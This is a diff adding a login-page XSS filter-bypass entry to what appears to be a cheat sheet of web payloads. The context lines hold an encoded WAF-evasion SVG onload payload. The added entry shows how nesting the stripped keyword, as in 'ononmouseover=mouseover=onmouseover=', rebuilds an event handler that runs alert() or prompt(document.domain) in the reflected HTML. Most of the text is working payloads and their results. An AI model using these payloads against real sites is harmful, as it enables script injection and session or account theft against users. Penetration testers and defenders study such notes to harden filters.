@@ -132,3 +132,24 @@ top["al"+"ert"]
 No 403 but 400 status code this time so we encode brackets:
 
 <Svg/Onload=top%5B"al"%2B"ert%5D(1)//
+
+login XSS filter bypass:
+
+Input: "<> onmouseover="hack()
+
+Reflection:
+<a class="login-link v-button" href="site.com/test"&lt;&gt; "hack()">Log in 
+
+* <,>, on*   => Filtered
+* "    => Not Filtered
+
+Bypass:
+ononmouseover=mouseover=onmouseover="alert()
+
+The application will strip off the restricted word "onmouseover=" and the reflection will be:
+
+"onmouseover="hack()
+or
+"onmouseover="prompt(document.domain)
+
+Note: Application was only blocking eventhandlers and tags were not allowed so escaping to HTML context was not possible.
